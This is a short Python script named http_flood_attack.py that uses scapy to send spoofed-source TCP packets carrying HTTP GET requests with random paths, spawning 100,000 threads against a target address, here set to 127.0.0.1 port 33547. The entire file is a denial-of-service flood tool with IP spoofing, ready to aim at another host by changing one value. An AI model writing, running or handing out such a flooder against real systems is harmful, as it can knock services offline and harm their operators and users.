# http_flood_attack.py

from scapy.all import *
import threading
import random
import string

def send_http_request():
    target_ip = '127.0.0.1'
    target_port = 33547
    # Generate a random URL path of a 10 characters
    random_path = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    url = f'/path/to/resource/{random_path}'
    
    http_request = IP(src=RandIP(), dst=target_ip)/TCP(sport=RandShort(), dport=target_port)/Raw(load=f'GET {url} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n')
    send(http_request)

def http_flood_attack():
    for _ in range(100000):
        thread = threading.Thread(target=send_http_request)
        thread.start()

if __name__ == "__main__":
    http_flood_attack()
